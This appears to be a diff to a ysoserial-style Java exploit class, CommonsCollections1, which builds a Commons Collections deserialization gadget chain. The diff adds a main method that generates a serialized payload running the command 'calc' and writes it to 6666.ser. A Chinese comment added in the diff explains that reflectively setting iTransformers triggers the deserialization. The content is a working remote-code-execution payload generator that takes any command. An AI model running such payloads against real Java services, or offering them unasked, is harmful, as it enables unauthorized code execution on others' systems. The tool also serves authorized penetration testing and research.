@@ -42,6 +42,15 @@ import java.util.Map;
  */
 public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
+    public static void main(String[] args) throws Exception {
+        String           cmd    = "calc";
+        String[]         params = new String[]{cmd};
+        byte[]           bytes  = (byte[]) CommonsCollections1.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollections1.class.newInstance(), PayloadType.nu1r, params);
+        FileOutputStream fous   = new FileOutputStream("6666.ser");
+        fous.write(bytes);
+        fous.close();
+    }
+
     @Override
     public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
@@ -55,7 +64,7 @@ public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
         final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
         final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// arm with actual transformer chain
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// 反射修改iTransformers属性会触发反序列化
 
         return handler;
     }
